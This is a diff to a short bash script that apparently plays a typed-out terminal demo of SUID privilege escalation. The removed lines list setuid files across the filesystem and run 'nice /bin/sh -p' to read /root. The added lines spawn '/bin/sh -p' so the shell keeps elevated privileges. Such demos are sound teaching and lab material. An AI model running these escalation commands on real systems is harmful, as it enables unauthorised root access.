@@ -1,9 +1,6 @@
 #!/bin/bash
 
 echo -n "$ "
-echo "find / -type f -perm 04000 -ls 2>/dev/null" | pv -qL 10 
-find / -type f -perm 04000 -ls 2>/dev/null
-echo -n "$ "
-echo "nice /bin/sh -p -c \"ls -l /root\"" | pv -qL 10 
-nice /bin/sh -p -c \"ls -l /root\"
+echo "/bin/sh -p" | pv -qL 10 
+bash -c "/bin/sh -p"
 exit
